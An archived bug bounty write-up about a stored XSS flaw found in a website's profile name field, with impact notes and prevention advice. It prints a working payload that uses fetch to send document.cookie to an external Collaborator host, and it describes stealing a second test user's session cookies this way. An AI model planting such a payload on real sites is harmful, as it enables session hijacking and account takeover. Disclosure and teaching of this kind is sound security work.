# Stored XSS via Profile Name Field

- **Source URL:** https://markazgasimov.medium.com/stored-xss-via-profile-name-field-4235fd476617?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250713132313/https://markazgasimov.medium.com/stored-xss-via-profile-name-field-4235fd476617?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/10062 (id 10062)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Stored XSS via Profile Name Field

While performing a routine bug bounty test on a website, I came across a **Stored Cross-Site Scripting (XSS)** vulnerability in the user profile section.

## Where it was found

After registering on the platform, I navigated to the profile settings page. The application allowed me to update my display name. Out of curiosity, I inserted the following payload into the name field:

**XSS Payload:**

```
<script>
fetch("https://axbupi3fxemyv6z76icj5s8dn4tvhm5b.oastify.com/steal?c=" 
+ document.cookie);
</script>
```
After saving the changes and refreshing the page, the script executed immediately and made a request to my Collaborator URL, sending my cookies via a `fetch` call. This confirmed that the input was not properly sanitized or encoded before being rendered on the page.

To verify whether the vulnerability affected other users and not just my own account, I created a separate test account. After logging in with this new user, I visited the account where the payload had been injected.

Upon loading the page, the XSS payload executed automatically.

Using Burp Suite, I was able to intercept the request and confirmed that the cookies of the second user (the victim) were successfully accessed and exfiltrated via the injected script.

This confirmed that the stored XSS was not just self-reflective, but could be used to steal session data from other users — a critical security risk.

## What is Stored XSS?

**Stored Cross-Site Scripting (Stored XSS)** is a vulnerability where malicious JavaScript is saved on the server (e.g., in a database) and executed automatically when other users view the affected content.

## Potential Impact

- Session hijacking (stealing cookies)
- Account takeover
- Phishing via fake UI
- Browser-based malware delivery
- Privilege escalation (if admin views the payload)

## How to Prevent Stored XSS

- **Sanitize input:** Remove or escape harmful characters like `<`, `>`, `'`, `"`.
- **Encode output**: Use context-aware encoding (e.g., HTML encoding when outputting to the page).
- **Use Content Security Policy (CSP)**: Restrict which scripts can run.
- **Avoid rendering user input as raw HTML** unless absolutely necessary.

## Stored XSS Flow Diagram

```
[ Attacker ]
     |
     | 1. Sends malicious input (e.g. <script>alert('XSS')</script>)
     v
[ Web Application ]
     |
     | 2. Stores the input in the database (without proper filtering)
     v
[ Database ]
     |
     | 3. Malicious data is shown to other users
     v
[ Victim User ]
     |
     | 4. Browser executes the script (XSS)
     v
[ alert('XSS') / Cookie theft / etc. ]
```
Thanks for taking the time to read this short write-up.

I hope it was helpful for understanding how Stored XSS works in real-world scenarios.
